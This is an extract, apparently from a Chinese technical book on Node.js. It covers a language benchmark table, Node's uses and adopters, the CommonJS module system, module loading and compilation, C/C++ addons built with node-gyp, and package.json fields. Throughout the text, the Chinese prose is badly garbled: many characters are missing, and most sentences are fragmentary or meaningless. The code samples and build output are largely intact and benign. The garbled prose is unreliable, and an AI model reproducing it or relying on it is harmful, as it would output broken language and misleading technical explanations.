Java 0m1.305s #2 Java(TM)SERuntimeEnvironment (build 1.6.0_35-b10-428-11M3811) JavaHotSpot(TM)64-BitServerVM(build20.10-b01-428,mixedmode) 
Go 0m1.667s #3 Goversiongo1.0.2 
Scala 0m1.808s #4 Scalacoderunnerversion 2.9.2 --Copyright 2002-2011,LAMP/EPFL 
LuaJIT 0m2.579s #5 LuaJIT2.0.0-beta10--Copyright(C)2005-2012MikePall. 
Node 0m2.872s #6 v0.8.8 
Ruby2.0.0-p0 0m27.777s #7 ruby2.0.0p0 (2013-02-24 revision 39474)[x86_64-darwin12.2.0] 
pypy 0m30.010s #8 Python2.7.2(341e1e3821ff,Jun072012,15:42:54)[PyPy1.9.0 with GCC 4.2.1] 
Ruby1.9.x 0m37.404s #9 ruby1.9.3p194 (2012-04-20 revision 35410)[x86_64-darwin12.1.0] 
Lua 0m40.709s #10 Lua5.1.4Copyright(C)1994-2008Lua.org,PUC-Rio 
Jython 0m53.699s #11 Jython2.5.2 
PHP 1m17.728s #12 PHP5.4.6(cli) (built: Sep 8 2012 23:49:53) 
Python 1m17.979s #13 Python2.7.2 
Perl 2m41.259s #14 Thisisperl5,version12,subversion4(v5.12.4)built for darwin-thread-multi-2level 
Ruby 1.8.x 3m35.135s #15 ruby 1.8.7 (2012-02-08 patchlevel 358)[universal-darwin12.0]
这样的测试管不能反个语言的性能优，已经可以Node在性能上不的。从一个，这可以CPU应用实并不可。CPU应用Node的要是由于JavaScript线程的因，有时的（大环），
会CPU时不能，使后续I/O发起。是分解大务为多个
小务，使能时，不I/O用的发起，这样可时享到并I/O的好
，能分用CPU。
关于CPU应用，Node的I/O
已经解决了在线程上CPU与I/O之用的问题，I/O的性能CPU的小。对于时的，它的时过I/O的时，应用场景就要新，因为这I/O还，甚至就是一个的场景，本没有I/O。应用场景应用多线程的。Node没有多线程用于，是还是有以下个分用CPU。
. Node可以过编写C/C++的高用CPU，一些V8不能做到性能极的
过C/C++实。由上的测试可以到，过C/C++的实数，Java还。
线程的Node不能，甚至用了C/C++后还不，过程的
，一部分Node程做服务程用于，后用程的，与I/O分，这样还能分用多CPU。

CPU不可，是。
1.5.3
有人会JavaScript一统前后端了，会不会他的语言言语中了机。
在Web端，过大多都是的编写的程序，这用下应用数的过程中着的时，用多线程解决这，多小题大作。在Node中，语言可天并的性在这场景中分有。对于已有的定系统，并着我们要。
LinkedIn在他们的动网上的实践了这个问题。有的系统有定的数，续为统网服务，时为动数源，Node数源做数接，发并的优势，不用关心它后是用语言实的。
这，国内的经也有很好的实践。经是从有的Java目中分一个目，在这个目中，没有继续用Java/JSP是用NodeWeb端的开发，使前端工程在HTTP的端能高灵活开发，了Java的一，用Java作为后端接中，使有好的定性。者相，补。

1.5.4
的数对Node的分应用是一个的。分应用着对可性的要高。数要在一个数中要的数。开发了中应用NodeFox、ITier，数做了分，用是对SQL，中分解SQL，并多数中数并并。NodeFox能实对多MySQL数的，一MySQL一样，ITier强大，多个数个数一样，这的多个数是不的数，MySQL他的数。
这个实也是高用并I/O的。Node高用并I/O的过程，也是高使用数的过程。对于Node，这个为只是一次的I/O。对于数言，是一次复杂的，以也是分源的过程。



1.6Node 
在年多的时，Node门，使用者也多。这些使用者对于Node的自也不相。经过，要有下几。
一这的是。开了Cocktail，用自己深的前端，YUI3这个前端的能Node到服务端，使使用者了工作中一写JavaScript一写PHP的上下。
. NodeI/OVoxerNode应用在实时语上。国内的朋友网Node应用在接中，以实时能，网、过socket.io实实时的能。
. I/OeBay是这的。的NodeFoxeBay的ql.io都是用Node并I/O的能，高使用已有的数。
. I/OWeb经LinkedIn的动网是这，的序请，大用并I/O，加数的Web的。
. NodeNode入Azure的开发中，、在服务上Node应用托管服务，Joyent是中Node的。这JavaScript的开发上的优势，以源用、高性能的。
. 对实时并发有很高的要，网开源了pomelo实时，可以应用在高实时应用中。
. 过Java他语言的前端工应用，一些前端工程用Node写，用前端熟悉的语言为前端熟悉的工。

1.7
本的源下
. http://www.infoq.com/cn/articles/what-is-nodejs 
. https://github.com/popular/watched . http://groups.google.com/group/nodejs/browse_thread/thread/85f6a3829bc64cb6 . http://groups.google.com/groups/profile?enc_user=dPo6jggAAACthftLMWCfUq8U6obMz179 
. http://search.npmjs.org/ . http://code.google.com/p/v8/ . http://cnodejs.org/topic/4f16442ccae1f4aa27001137 . http://weibo.com/1744667943/eBszJXcEsX1 . http://stackoverflow.com/questions/5621812/why-is-node-js-named-node-js . http://www.theregister.co.uk/2011/03/01/the_rise_and_rise_of_node_dot_js/page4.html . http://ued.taobao.com/blog/2011/09/02/what-is-nod/ . http://www.infoq.com/cn/news/2012/04/interview-xueqiu-using-nodejs . http://teddziuba.com/2011/10/node-js-is-cancer.html . http://www.cnblogs.com/fengmk2/archive/2011/12/14/2288147.html

 
第章 



，我想从为你Node。
JavaScript自生以，经没有人它做一门的编程语言，认为它不过是一网页小脚本已，在Web1.0时，这脚本语言在网中要有个作用广为，一个是，一个是网页。一，由于创，以它自的也编程人广为。到Web 2.0时，前端工程用它大大了网页上的用。在这个过程中，B/S应用C/S应用优的。至，JavaScript才广起。
在Web 2.0的过程中，前端开发，它们最初用于个本的，后着多的用在前端实，JavaScript也从跃到应用开发的上。在这个过程中，它大经了工、组、前端、前端应用的，图2-1。

图2-1 JavaScript的
经了的后天过程，JavaScript不，以好组织务。从一个言，它也了JavaScript天就的一能。
在他高语言中，Java有，Python有import机，Ruby有require，PHP有include require。JavaScript过<script>入的杂，语言自组织能。人们不不用人为，以到用的目的。
是起的JavaScript编程并不着社区没有，JavaScript的本编程之一在探索中。在Node之前，服务端JavaScript本没有场，与的前端JavaScript应用相，Rhino后端JavaScript环境本只是用于小工，是经多年的发后，社区也为JavaScript定了相应的，中CommonJS的是最为要的程。

2.1CommonJS 
CommonJS为JavaScript定了一个好的景——JavaScript能在。
2.1.1CommonJS
在JavaScript的发程中，它要在前端发发。由于（ECMAScript）的时，的小。这些中包、、上下、、（statement）、、对语言的本要。在实应用中，JavaScript的能决于环境中的API程。在Web1.0时，只有对DOM、BOM本的。着Web2.0的推，HTML5，它Web网页Web应用的时，在中了多、强大的APIJavaScript用，这W3C组织对HTML5的推以大对的大。是，Web在发，中了多的API，这些过程发生在前端，后端JavaScript的后。对于JavaScript自言，它的是的，还有以下。
. 
. ECMAScript仅定了部分心，对于系统，I/O没有
的API。就HTML5的发言，W3C在一定上是在推这个过程，是它仅于端。

. 在JavaScript中，几没有定过Web服务者数之的统一接。
. 这JavaScript应用中本没有自动加的能。

CommonJS的，要是为了弥补前JavaScript没有的，以到像Python、RubyJava开发大应用的能，不是在小脚本程序的。他们些用CommonJSAPI写的应用可以环境的能，这样不仅可以用JavaScript开发客端应用，且还可以编写以下应用。
服务端JavaScript应用程序。工。
图应用程序。
应用（TitaniumAdobe AIR的应用）。

今，CommonJS中的大部分是，是已经初，为JavaScript开发大应用程序了一的。目前，它在中，这些了、、Buffer、编、I/O、程环境、系统、接、测试、Web服务网关接、包管。
实践是相的，Node能以一熟的，不开CommonJS的。在服务端，CommonJS能以一的写个的目中，不开Node优的。实的优不开最初优的，因实的推广以。图2-2是Node与以W3C组织、CommonJS组织、ECMAScript之的关系，了一个的生系统。

图2-2 Node与以W3C组织、CommonJS组织、ECMAScript之的关系
NodeCommonJS的Modules实了一用的系统，NPM对Packages的好使Node应用在开发过程中事。在本中，我们要就Node的包的实开。

2.1.2CommonJS
CommonJS
对的定分，要分为用、定识3个部分。
1. 
用的下
var math = require('math'); 
在CommonJS中，在require()，这个接识，以入一个的API到前上下中。

2. 
在中，上下require()入外部。对应入的能，上下了exports对用于前的者量
，并且它是一的。在中，还在一个module对，它自，exports是module的性。在Node中，一个就是一个，在exports对上作为性可定的
// math.js 
exports.add = function () { 
var sum = 0,
 i = 0, 
 args = arguments, 
l = args.length; 
while (i < l) { 
 sum += args[i++]; } return sum; 
}; 
在一个中，我们过require()入后，就能用定的性了
// program.js var math = require('math'); exports.increment = function (val) { 
return math.add(val, 1); }; 

3. 
识实就是require()的数，它是小的，者以.、..开的相对，者绝对。它可以没有后.js。
的定分，接也分。它的在于的量定在有的作用中，时入能以接上下。图2-3，个有立的，它们不，在用时也。

图2-3定
CommonJS的这入机使用不量，与之相相。



2.2Node 
Node在实中并实，是对了一定的，时也加了自要的性。管中exports、requiremodule起分，是Node在实它们的过程中经了，这个过程要。
在Node中入，要经下3个。
(1) 分
(2) 定
(3) 编

在Node中，分为一是Node的，为心一是用编写的，为。
心部分在Node源的编过程中，编了。在Node程动
时，部分心就接加内中，以这部分心入时，定编这个可以，并且在分中优，以它的加是最的。
是在时动加，要的分、定、编过程，

心。接下，我们开的加过程。
2.2.1
开分定之前，我们要的一是，与前端会脚本以高性能一样，Node对入过的都会，以次入时的开。不的在于，仅仅，Node的是编之后的对。不是心还是，require()对相的次加都一用优的，这是的。不之在于心的于的。
2.2.2
因为识有几，对于不的识，的定有不程上的。
1. 
前到过，require()接一个识作为数。在Node实中，是于这样一个识的。识在Node中要分为以下几。
心，http、fs、path。. ...开始的相对。
以/开始的绝对。的，自定的connect。. 
心的优仅次于加，它在Node的源编过程中已经编为，加过程最。
试图加一个与心识相的自定，是不会的。自己编写了一个http用，想要加，一个不的识者用的。
式的文
以.、../开始的识，这都做。在分时，require()会为实，并以实作为索，编后的到中，以使次加时。
由于Node了的，以在过程中可以大量时，加于心。
定
自定的是心，也不是的识。它是一的，可能
是一个者包的。这的是最时的，也是有中最的一。在自定的之前，要一下这个。是Node在定的时定的，为一个组的
数组。关于这个的生，我们可以动试一。
(1) 创module_path.js，内为console.log(module.paths);。
(2) 到一个目中后node module_path.js。在Linux下，你可能到的是这样一个数组

[ '/home/jackson/research/node_modules', 
'/home/jackson/node_modules', '/home/node_modules', '/node_modules' ] 
在Windows下，也是这样
[ 'c:\\nodejs\\node_modules', 'c:\\node_modules' ] 
可以，的生下。
前目下的node_modules目。目下的node_modules目。目的目下的node_modules目。
上，到目下的node_modules目。

它的生与JavaScript的作用
的分。在加的过程中，Node会个试中的，到到目为。可以，前的深，
时会多，这是自定的加是最的因。
2. 文件定位
从加的优使次入时不要分、定编的过程，大大高了次加时的。在的定过程中，还有一些要，这要包括的分、目包的。
文a 
require()在分识的过程中，会识中不包的情。CommonJS也在识中不包，这情下，Node会.js、.json、.node的次序补，次试。
在试的过程中，要用fs是否在。因为Node是线程的，以这是一个会起性能问题的。小是是.node.json，在require()的识中上，会加一。一个是，可以大解Node
线程中用的。
. 
在分识的过程中，require()过分之后，可能没有到对应，到一个目，这在入自定个时经会，时Node会目做一个包。
在这个过程中，Node对CommonJS包了一定程的。，Node在前目下package.json（CommonJS包定的包），过JSON.parse()解包对，从中main性定的定。，会入分的。
main性定的，者没有package.json，Node会index做认，后次index.js、index.json、index.node。在目分的过程中没有定，自定入下一个。数组都遍，没有到目，会的。
2.2.3模块编译
在Node中，个都是一个对，它的定下
function Module(id, parent) { this.id = id; this.exports = {}; this.parent = parent; if (parent && parent.children) { 
 parent.children.push(this); } 
this.filename = null; this.loaded = false; this.children = []; 
} 
编是入的最后一个。定到的后，Node会新一个对，后入并编。对于不的，入也有不，下。
. .js文件。过fs读后编。
. .node文件。这是用C/C++编写的
，过dlopen()加最后编生的。
. .json文件。过fs读后，用JSON.parse()解。
其余扩展名文件。它们都做.js入。
一个编的都会作为索在Module._cache对上，以高

次入的性能。不的，Node会用不的读，.json的用下
// Native extension for .json 
Module._extensions['.json'] = function(module, filename) { var content = NativeModule.require('fs').readFileSync(filename, 'utf8'); try { 
 module.exports = JSON.parse(stripBOM(content)); 
} catch (err) {  err.message = filename + ': ' + err.message;  throw err; 
} }; 
中，Module._extensions会require()的extensions性，以过在中问require.extensions可以系统中已有的加。编写下测试一下
console.log(require.extensions); 
到的下
{ '.js': [Function], '.json': [Function], '.node': [Function] } 
想对自定的的加，可以过require.extensions['.ext']的实。的CoffeeScript就是过加require.extensions['.coffee']的实加的。是从v0.10.6本开始，不过这自定的加，是他语言编JavaScript后加，这样做的好在于不的编加过程入Node的过程中。
在定的之后，Node用的编后用者。
1. JavaScript
到CommonJS，我们个中在着require、exports、module这3个

至在Node的API中，我们
量，是它们在中并没有定，从甚个中还有__filename、__dirname这个量的在，它们是从的我们接定的过程在端，会在量的情。
事实上，在编的过程中，Node对的JavaScript内了包。在部加了(function (exports, require, module, __filename, __dirname) {\n，在部加了\n});。一个的JavaScript会包下的样
(function (exports, require, module, __filename, __dirname) { var math = require('math'); exports.area = function (radius) { 
 return Math.PI * radius * radius; }; }); 
这样个之都了作用。包之后的会过vm生的runInThisContext()（eval，只是有上下，不），一个的function对。最后，前对的exports性、require()、module（对自），以在定中到的目作为数这个function()。
这就是这些量并没有定在个中在的因。在之后，的exports性了用。exports性上的性都可以外部用到，是中的余量性不可接用。
至，require、exports、module的程已经，这就是Node对CommonJS的实。
外，多初学者都经过为在exports的情下，还在module.exports。想情下，只要exports可
exports = function () { 
// My Class 
}; 
是都会到一个的。因在于，exports对是过的入的，接会的用，并不能作用外的。测试下
var change = function (a) { 
a = 100; 
console.log(a); // => 100 
}; 
var a = 10; change(a); console.log(a); // => 10 
要到require入一个的，请module.exports对。这个的不
的用。
2. C/C++
Node用process.dlopen()加。在Node的下，dlopen()在Windows *nix下分有不的实，过libuv了。
实上，.node的并不要编，因为它是编写C/C++之后编生的，以这只有加的过程。在的过程中，的exports对与.node产生系，后用者。
C/C++Node使用者的优势要是的，势是C/C++的编写门JavaScript高。
3. JSON
.json的编是3编中最的。Node用fs读JSON的内之后，用JSON.parse()到对，后它对的exports，以外部用。
JSON在用作目的时有用。你定了一个JSON作为，就不用fs读解，接用require()入可。外，你还可以享到的，并且次入时也没有性能。
这我们到的编都是，用自己编写的。在下一中，我们开心中的JavaScriptC/C++。
2.3
前到，Node的心在编可的过程中编了。心实分为C/C++编写的JavaScript编写的部分，中C/C++在Node目的src目下，JavaScript在lib目下。
2.3.1JavaScript
在编有C/C++之前，编程序要有的JavaScript编为C/C++，时是否接编为可了实不是。
1. C/C++
Node用了V8的js2c.py工，有内的JavaScript（src/node.jslib/*.js）C++的数组，生node_natives.h，相关下
namespace node { 
const char node_native[] = { 47, 47, ..}; const char dgram_native[] = { 47, 47, ..}; const char console_native[] = { 47, 47, ..}; const char buffer_native[] = { 47, 47, ..}; const char querystring_native[] = { 47, 47, ..}; const char punycode_native[] = { 47, 42, ..}; ... struct _native { 
 const char* name;  const char* source;  size_t source_len; 
}; 
static const struct _native natives[] = {  { "node", node_native, sizeof(node_native)-1 },  { "dgram", dgram_native, sizeof(dgram_native)-1 },  ... 
}; 
} 在这个过程中，JavaScript以的在node中，是不可接的。在动Node程时，JavaScript接加内中。在加的过程中，JavaScript心经
识分后接定到内中，的从中一一要很多。
2. JavaScript

lib目下的有也没有定require、module、exports这些量。在入JavaScript
心的过程中，也经了包的过程，后才了exports对。与
有区的在于源的（心是从内中加的）以的。
JavaScript心的定下的，源过process.binding('natives')，
编的到NativeModule._cache对上，到Module._cache对上
function NativeModule(id) { this.filename = id + '.js'; this.id = id; this.exports = {}; this.loaded = false; 
} NativeModule._source = process.binding('natives'); NativeModule._cache = {}; 
2.3.2C/C++
在心中，有些部由C/C++编写，有些由C/C++心部分，他部分由JavaScript实包外，以性能。后这C++内心，JavaScript外实的是Node能高性能的。，脚本语言的开发优于语言，是性能于语言。Node的这复可以在开发性能之到。
这我们些由C/C++编写的部分统一为内，因为它们不用接用。Node的buffer、crypto、evals、fs、os都是部分过C/C++编写的。
1. 
在Node中，内的内部定下
struct node_module_struct { 
int version; 
void *dso_handle; 
const char *filename; 
void (*register_func) (v8::Handle<v8::Object> target); 
const char *modname; }; 
一个内在定之后，都过NODE_MODULE定到node中，的
初始为的register_func 
#define NODE_MODULE(modname, regfunc)  \  
extern "C" {  \  
 NODE_MODULE_EXPORT node::node_module_struct modname ## _module =  \  
{  \  
NODE_STANDARD_MODULE_STUFF,  \  
regfunc,  \  
NODE_STRINGIFY(modname)  \  
 };  \  

} node_extensions.h这些的内统一了一个node_module_list的数组中，这些有
. node_buffer 
. node_crypto 
. node_evals 
. node_fs 
. node_http_parser 
. node_os 
. node_zlib 
. node_timer_wrap 
. node_tcp_wrap 
. node_udp_wrap 
. node_pipe_wrap 
. node_cares_wrap 
. node_tty_wrap 
. node_process_wrap 
. node_fs_event_wrap 

. node_signal_watcher 这些内的也分。Node了get_builtin_module()从node_module_list数组中这些。内的优势在于，它们本由C/C++编写，性能上优于脚本语言次，在
编时，它们编。一Node开始，它们接加内中，次做识定、定、编过程，接就可。
2. 
在Node的有中，在着图2-4的一关系，可能会心，心可能会内。

图2-4关系
，不推荐接用内。用，接用心可，因为心中本都了内。内是内部量，以外部JavaScript心用的
Node在动时，会生一个量process，并Binding()加内。Binding()的实在src/node.cc中，下
static Handle<Value> Binding(const Arguments& args) { HandleScope scope; 
Local<String> module = args[0]->ToString(); String::Utf8Value module_v(module); node_module_struct* modp; 
if (binding_cache.IsEmpty()) { 
 binding_cache = Persistent<Object>::New(Object::New()); } 
Local<Object> exports; 
if (binding_cache->Has(module)) {  exports = binding_cache->Get(module)->ToObject();  return scope.Close(exports); 
} 
// Append a string to process.moduleLoadList char buf[1024]; snprintf(buf, 1024, "Binding %s", *module_v); uint32_t l = module_load_list->Length(); module_load_list->Set(l, String::New(buf)); 
if ((modp = get_builtin_module(*module_v)) != NULL) {  exports = Object::New();  modp->register_func(exports);  binding_cache->Set(module, exports); 
} else if (!strcmp(*module_v, "constants")) {  exports = Object::New();  DefineConstants(exports); binding_cache->Set(module, exports); 
#ifdef __POSIX__ 
} else if (!strcmp(*module_v, "io_watcher")) {  exports = Object::New();  IOWatcher::Initialize(exports);  binding_cache->Set(module, exports); 
#endif 
} else if (!strcmp(*module_v, "natives")) { exports = Object::New();  DefineJavaScript(exports); binding_cache->Set(module, exports); 
} else { 
 return ThrowException(Exception::Error(String::New("No such module"))); } 
return scope.Close(exports); } 
在加内时，我们创一个exports对，后用get_builtin_module()
内对，过register_func()exports对，最后exports对，
并用。这个不仅可以内，还能一些的内。前到的JavaScript心
为C/C++数组后，是过process.binding('natives')在NativeModule._ source中的
NativeModule._source = process.binding('natives'); 
过js2c.py工的数组，后新为，以对JavaScript心编。
2.3.3
前了心的，也解了心的入为是最的。
从图2-5的os生的入程可以到，为了CommonJS，从JavaScript到C/C++的过程是相复杂的，它要经C/C++的内定、（JavaScript）心的定入以（JavaScript）的入。是对于用言，require()分、友好。

图2-5 os生的入程
2.3.4
心编要一定。作为Node的使用者，管几没有机会与心的开发，是了解开发心有于我们加深入了解Node。心中的JavaScript部分几与的开发相，CommonJS，上
下中了有require、module、exports外，还可以用Node中的一些量，这不做。下我们以C/C++为编写内。为了于解，我们编写一个极的JavaScript本的，这个一个Hello world!
exports.sayHello = function () { return 'Hello world!'; }; 
编写内分编写编写C/C++。
(1) 以下为node_hello.h，到Node的src目下
#ifndef NODE_HELLO_H_ #define NODE_HELLO_H_ #include <v8.h> 
namespace node { // 定义方法 v8::Handle<v8::Value> SayHello(const v8::Arguments& args); 
} #endif 
(2) 编写node_hello.cc，并到src目下
#include <node.h> #include <node_hello.h> #include <v8.h> 
namespace node { 
using namespace v8; //实现定义的方法 Handle<Value> SayHello(const Arguments& args) { 
HandleScope scope; return scope.Close(String::New("Hello world!")); } 
//给传入的目对象加 sayHello方法 void Init_Hello(Handle<Object> target) { target->Set(String::NewSymbol("sayHello"), FunctionTemplate::New(SayHello)->GetFunction()); } 
} //调用NODE_MODULE()将注方法定义内存中 NODE_MODULE(node_hello, node::Init_Hello) 
以上了内的编写，是要Node认为它是内，还要src/node_extensions.h，在NODE_EXT_LIST_END前加NODE_EXT_LIST_ITEM(node_hello)，以node_hello加node_module_list数组中。
次，还要编写的编，时要Node的目生node.gyp，并在'target_name': 'node'的sources中加上新编写的个。后编个Node目，的编请A。
编后，接在中以下，会到的
$ node > var hello = process.binding('hello'); undefined > hello.sayHello(); 'Hello world!' > 
至，生编写过程中要的都已过了。可以，的过JavaScript编写可以大大高生产。这我们写作本的目的是有能的读者可以深入Node的心，学习它者它。
2.4C/C++
对于前端工程，C/C++生，是你了解了它，在性能时会对你有极大的。
JavaScript的一个就是。JavaScript的Java的实，是Java是在int数的上的，JavaScript中只有double的数，在的过程中，要double为int，后。以，在JavaScript上做的
不高。在应用中，会的，包括、编过程，过JavaScript实，CPU源会很多，这时编写C/C++性能的机会了。
C/C++于中的一。前的编部分时到，C/C++过编为.node，后用process.dlopen()加。在这一中，我们分个C/C++的编写、编、加、的过程。
在开始编写之前，要强的一是，Node的生一定程上是可以的，前是源可以在*nixWindows上编，中*nix下过g++/gcc编编为动接享对（.so），在Windows下要过VisualC++的编编为动接（.dll），图2-6。这有一个人的，就是用加时是.node。实.node的只是为了起自一，不会因为产生不的。实上，在Windows下它是一个.dll，在*nix下是一个.so。为了实，dlopen()在内部实时区分了，分用的是加.so.dll的。图2-6为在不上编加的过程。
的是，一个下的.node在一个下是加的，新用自下的编编为的.node。

图2-6不上的编加过程
2.4.1
想要编写高质量的C/C++，还要深的C/C++编程才。之外，以
下这些目都是不能开的，在了解它们之后，可以你在编写过程中事。. GYP在Node0.6中，过它自的node_waf工实编，是它是*nix下的产，实编。在Node 0.8中，Node决定node_waf用好的目生，它就是GYP工，Generate Your Projects的写。它的好在于，可以你生个下的目，Windows下的Visual Studio解决（.sln）、Mac下的XCode目以Scons工。在这个上，动用自下的编编目。这大大了在目组织上的入。Node源中一过目，后统一为GYP工。这了可以编写目的工作量外，一个的因就是Node自的源就是过GYP编的。为，Nathan Rajlich于GYP为Node了一个有的工node-gyp，这个工过npm install -g node-gyp这个可。
. V8C++V8是Node自的动源之一。它自由C++写，可以实JavaScript与C++的相用。
. libuv它是Node自的动源之。Node能实的一个就是它的libuv，这个是的一，过它用一些作，自己在个下编写实要高多。libuv的能包括事环、作。
. Node写C++时，不了要做一些对的编程工作，Node自了一些C++，node::ObjectWrap可以用包你的自定，它可以实对收工作。

. 他在deps目下的在编写时也可以你，zlib、openssl、http_parser。

2.4.2C/C++
在C/C++内时，实已经了C/C++的编写。的与内的区在于源编Node，是过dlopen()动加。以在编写的时，源写node，也不要。下我们用一个C/C++的编写。
它的JavaScript与前的一样
exports.sayHello = function () { return 'Hello world!'; }; 
新hello目作为自己的目，编写hello.cc并到src目下，相关下
#include <node.h> #include <v8.h> 
using namespace v8; //实现定义的方法 Handle<Value> SayHello(const Arguments& args) { 
HandleScope scope; return scope.Close(String::New("Hello world!")); } 
//给传入的目对象加 sayHello()方法 void Init_Hello(Handle<Object> target) { 
target->Set(String::NewSymbol("sayHello"), FunctionTemplate::New(SayHello)->GetFunction()); } //调用NODE_MODULE()方法将注方法定义内存中 NODE_MODULE(hello, Init_Hello) 
C/C++与内的一样，在target对上，后过NODE_MODULE可。由于不像编写内样对到node_module_list中，以认作是一个生，只能过dlopen()动加，后JavaScript用。
2.4.3C/C++
在GYP工的下，C/C++的编是一心的事情，为个编写不的目编。写好.gyp目是编外的大事，你也心事，因
为.gyp目是的。node-gyp定.gyp
{ 'targets': [
 { 'target_name': 'hello', 'sources': [ 
 'src/hello.cc' ], 'conditions': [ 
 ['OS == "win"',  { 
'libraries': ['-lnode.lib'] } ] 
] } ] } 
后用
$ node-gyp configure 
会到下的
gyp info it worked if it ends with ok gyp info using node-gyp@0.8.3 gyp info using node@0.8.14 | darwin | x64 gyp info spawn python 
为binding.gyp，内下
gyp info spawn args [ '/usr/local/lib/node_modules/node-gyp/gyp/gyp', 
gyp info spawn args   'binding.gyp',  
gyp info spawn args   '-f',  
gyp info spawn args   'make',  
gyp info spawn args   '-I',  
gyp info spawn args   '/Users/jacksontian/git/diveintonode/examples/02/addon/build/config.gypi',  
gyp info spawn args   '-I',  
gyp info spawn args   '/usr/local/lib/node_modules/node-gyp/addon.gypi',  
gyp info spawn args   '-I',  
gyp info spawn args   '/Users/jacksontian/.node-gyp/0.8.14/common.gypi',  
gyp info spawn args   '-Dlibrary=shared_library',  
gyp info spawn args   '-Dvisibility=default',  
gyp info spawn args   '-Dnode_root_dir=/Users/jacksontian/.node-gyp/0.8.14',  
gyp info spawn args   '-Dmodule_root_dir=/Users/jacksontian/git/diveintonode/examples/02/addon',  
gyp info spawn args   '--depth=.',  
gyp info spawn args   '--generator-output',  
gyp info spawn args   'build',  
gyp info spawn args   '-Goutput_dir=.' ]  
gyp info ok 

node-gyp configure这个会在前目中创build目，并生系统相关的目。在*nix下，build目中会Makefile在Windows下，会生vcxproj。继续下
$ node-gyp build 
会到下的
gyp info it worked if it ends with ok 
gyp info using node-gyp@0.8.3 
gyp info using node@0.8.14 | darwin | x64 
gyp info spawn make 
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ] 
CXX(target) Release/obj.target/hello/hello.o 
SOLINK_MODULE(target) Release/hello.node 
SOLINK_MODULE(target) Release/hello.node: Finished 
gyp info ok 
编过程会不，分过makevcbuild编。编后，hello.node
会生在build/Release目下。
2.4.4C/C++
到hello.node后，用实在前已经。require()过解识、分、定，后加可。下的入前编到的.node，并用中的
var hello = require('./build/Release/hello.node'); 
console.log(hello.sayHello());
以上为hello.js，用node hello.js可到下的
Hello world! 
对于以.node为的，Node会用process.dlopen()加
//Native extension for .node 
Module._extensions['.node'] = process.dlopen;
对于用者言，require()是的。对于的编写者，process.dlopen()中的过程了解一。
图2-7，require()在入.node的过程中，实上经了4个上的用。
加.node实上经了个，一个是用uv_dlopen()开动接，个是用uv_dlsym()到动接中过NODE_MODULE定的。这个过程都是过libuv的在*nix下实上用的是dlfcn.h中定的dlopen()dlsym()个在Windows是过LoadLibraryExW()GetProcAddress()这个实的，它们分加.so.dll（实为.node）。

图2-7 require()入.node的过程
这对libuv数的用分Node用libuv实的，这样的情景在很多还会。
由于编写时过NODE_MODULE定为node_module_struct，以在数之后，它为node_module_struct几是对接的。接下的过程就是入的exports对作为实，C++中定的在exports对上，后用者就可以用了。
C/C++与JavaScript的区在于加之后不要编，接之后就可以外部用了，加JavaScript。
使用C/C++的一个好在于可以灵活动加它们，Node自性的时，Node的可性。
关于node-gyp工的多可以https://github.com/TooTallNate/node-gyp（作者为Nathan Rajlich，Node源的心贡献者之一）。
2.5
、心、内、C/C++的之后，有要一下之的用关系，图2-8。
C/C++内于最的，它于心，要APIJavaScript心JavaScript用。你不是了解要用的C/C++内，请量过process.binding()接用，这是不推荐的。
JavaScript心要的有一是作为C/C++内的接，用一是的能，它不要，是分要。

图2-8之的用关系
由编写，包括JavaScriptC/C++，要用为JavaScript用。
2.6NPM 
Node组织了自的心，也使可以有序编写使用。是在中，与之是在的，相之不能接用。在之外，包NPM是系起的一机。
在NPM之前，不不起CommonJS的包。JavaScript不Java者他语言样，有包。Node对的实，一定程上解决了量、关系组织性问题。包的，是在的上一组织JavaScript。图2-9为包组织图。

图2-9包组织图
CommonJS的包的定实也分，它由包包个部分组，前者用于组织包中的，后者用于包的相关信，以外部读分。
2.6.1
包实上是一个，一个目接包为.ziptar.gz的，后解还为目。CommonJS的包目应包下这些。
. package.json包。
. bin用于可的目。
. lib用于JavaScript的目。
. doc用于的目。
. test用于测试用的。

可以到，CommonJS包从、测试都做过。一个包后外时，用到测试的时候，会他们一实可的。

2.6.2NPM 
包用于相关的信，它是一个JSON的package.json，于包的目下，是包的要组部分。NPM的有为都与包的相关。由于CommonJS包于，NPM在实践中做了一定的，在后会到。
CommonJS为package.json定了下一些的。
. name。包。定它要由小写的数组，可以包.、_-，不。包是一的，以对外时产生的解。之外，NPM还不要在包中上nodejs复识它是JavaScriptNode。
. description。包。
. version。本。一个语的本，这在http://semver.org/上有定，为major.minor.revision。本分要，用于一些本的场。
. keywords。关数组，NPM中要用做分索。一个好的关数组有于用
到你编写的包。

. maintainers。包者。个者由name、emailweb这3个性组。下"maintainers": [{ "name": "Jackson Tian", "email": "shyvo1987@gmail.com", "web": "http://html5ify. 
com" }]  
NPM过性认。
. contributors。贡献者。在开源社区中，为开源目是经的事情，能在目的contributors中，是一有的事。中的一个贡献应是包的作者本人。它的与者相。
. bugs。一个可以反bug的网页。
. licenses。前包使用的可，这个包可以在些可下使用。它的下
"licenses": [{ "type": "GPLv2", "url": "http://www.example.com/licenses/gpl.html", }] 

. repositories。托管源的，可以过些问包的源。2
. dependencies。使用前包要的包。这个性分要，NPM会过这个

性自动加的包。了外，还定了一部分可，下。
. homepage。前包的网。
. os。作系统。这些作系统的包括aix、freebsd、linux、macos、solaris、vxworks、windows。了为，不对作系统做。

. cpu。CPU的，有的有arm、mips、ppc、sparc、x86x86_64。os一样，为，不对CPU做。
. engine。的JavaScript，有的包括ejs、flusspferd、gpsee、jsc、spidermonkey、narwhal、nodev8。
. builtin。前包是否是内在系统的组。
. directories。包目。. implements。实的。前包实了CommonJS的些。
. scripts。脚本对。它要包管用、编、测试包
。下

"scripts": { "install": "install.js", 
"uninstall": "uninstall.js", 
"build": "build.js",  
"doc": "make-doc.js", 
"test": "test.js" } 
包的定可以Node解决包的问题，NPM是于了实。最初，NPM工是由IsaacZ.Schlueter创，Node服务的Node包管，要。后，在v0.6.3本时Node中作为认包管，作为包的一部分一起。之后，Isaac Z.Schlueter也为Node的门人。
在包的中，NPM实要的要有name、version、description、keywords、repositories、author、bin、main、scripts、engines、dependencies、devDependencies。
与包的区在于多了author、bin、maindevDependencies这4个，下补一下。
. author。包作者。
. bin。一些包作者包可以作为工使用。好bin后，过npm install package_name -g可以脚本加到中，之后可以在中接。前的node-gyp是这样的。过-g的包为。

. main。入require()在入包时，会优这个，并作为包中余的入。不在这个，require()会包目下的index.js、index.node、
index.json作为认入。
. devDependencies。一些只在开发时要。这个性，可以包的后续开
发者包。下是express目的package.json，有一定的
